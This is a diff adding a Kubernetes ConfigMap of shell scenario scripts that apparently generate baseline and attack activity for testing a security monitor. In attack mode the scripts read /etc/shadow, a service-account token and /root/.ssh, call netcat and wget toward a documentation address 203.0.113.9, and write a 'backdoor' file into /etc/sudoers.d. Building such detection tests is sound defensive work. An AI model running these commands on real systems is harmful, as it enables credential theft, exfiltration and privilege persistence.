@@ -1,0 +1,79 @@
+# RFC 0001 场景脚本:每个脚本 $1 = baseline | attack。
+# busybox sh 兼容;攻击目的地 203.0.113.9 为 TEST-NET-3 文档地址(不会真正连通)。
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: abip-scenario-scripts
+  namespace: openshell
+data:
+  coding.sh: |
+    MODE="${1:-baseline}"
+    mkdir -p /workspace/src
+    N=30; [ "$MODE" = attack ] && N=10
+    i=0
+    while [ $i -lt $N ]; do
+      echo "print('hello')" > /workspace/src/main.py
+      cat /workspace/src/main.py > /dev/null
+      sh -c "ls /workspace/src" > /dev/null
+      cp /workspace/src/main.py /tmp/build.out
+      tar czf /tmp/dist.tar.gz /workspace 2>/dev/null
+      wget -q -T 2 -O /dev/null http://10.96.0.1/pkg 2>/dev/null
+      i=$((i+1)); sleep 1
+    done
+    if [ "$MODE" = attack ]; then
+      cat /etc/shadow 2>/dev/null
+      sh -c "nc -w 2 203.0.113.9 4444 < /dev/null" 2>/dev/null
+      wget -q -T 3 -O /dev/null http://203.0.113.9/exfil 2>/dev/null
+      i=0
+      while [ $i -lt 5 ]; do
+        cat /workspace/src/main.py > /dev/null
+        i=$((i+1)); sleep 1
+      done
+    fi
+    echo scenario-done
+  data.sh: |
+    MODE="${1:-baseline}"
+    mkdir -p /workspace
+    N=30; [ "$MODE" = attack ] && N=10
+    i=0
+    while [ $i -lt $N ]; do
+      dd if=/dev/zero of=/workspace/data.csv bs=1024 count=8 2>/dev/null
+      cat /workspace/data.csv > /dev/null
+      gzip -f /workspace/data.csv
+      tar czf /tmp/data.tar.gz /workspace 2>/dev/null
+      wget -q -T 2 -O /dev/null http://10.96.0.10/api 2>/dev/null
+      i=$((i+1)); sleep 1
+    done
+    if [ "$MODE" = attack ]; then
+      cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null
+      ls /root/.ssh 2>/dev/null
+      sh -c "nc -w 2 203.0.113.9 4444 < /dev/null" 2>/dev/null
+      i=0
+      while [ $i -lt 5 ]; do
+        cat /workspace/data.csv.gz > /dev/null 2>&1
+        i=$((i+1)); sleep 1
+      done
+    fi
+    echo scenario-done
+  ops.sh: |
+    MODE="${1:-baseline}"
+    N=30; [ "$MODE" = attack ] && N=10
+    i=0
+    while [ $i -lt $N ]; do
+      cat /etc/passwd > /dev/null
+      cat /etc/hosts > /dev/null
+      ls /var/log > /dev/null
+      wget -q -T 2 -O /dev/null http://10.96.0.1/healthz 2>/dev/null
+      i=$((i+1)); sleep 1
+    done
+    if [ "$MODE" = attack ]; then
+      cat /etc/shadow 2>/dev/null
+      echo "* * * * * root /tmp/x" > /etc/sudoers.d/backdoor 2>/dev/null
+      sh -c "nc -w 2 203.0.113.9 4444 < /dev/null" 2>/dev/null
+      i=0
+      while [ $i -lt 5 ]; do
+        cat /etc/hosts > /dev/null
+        i=$((i+1)); sleep 1
+      done
+    fi
+    echo scenario-done
